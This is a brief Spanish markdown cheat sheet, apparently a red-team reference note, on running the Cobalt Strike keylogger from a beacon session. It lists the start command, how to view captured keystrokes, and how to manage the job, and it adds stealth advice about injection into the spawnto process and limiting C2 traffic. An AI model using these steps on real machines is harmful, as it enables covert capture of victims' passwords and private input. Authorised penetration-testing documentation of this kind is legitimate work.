---
title: Cobalt Strike — Keylogger
tags: [cobalt-strike, post-ex, keylogger]
---

# Keylogger

## Iniciar keylogger

```
beacon> keylogger
```

## Ver pulsaciones capturadas

**View → Keystrokes**

## Gestión del job

```
beacon> jobs          # Ver jobs en ejecución
beacon> jobskill <id> # Matar el keylogger
```

> [!tip] El keylogger corre como un **post-ex job** inyectado en el proceso `spawnto` — no queda en el proceso objetivo directamente.

> [!warning] Mantenerlo activo durante mucho tiempo aumenta el volumen de tráfico C2. Usar con moderación.
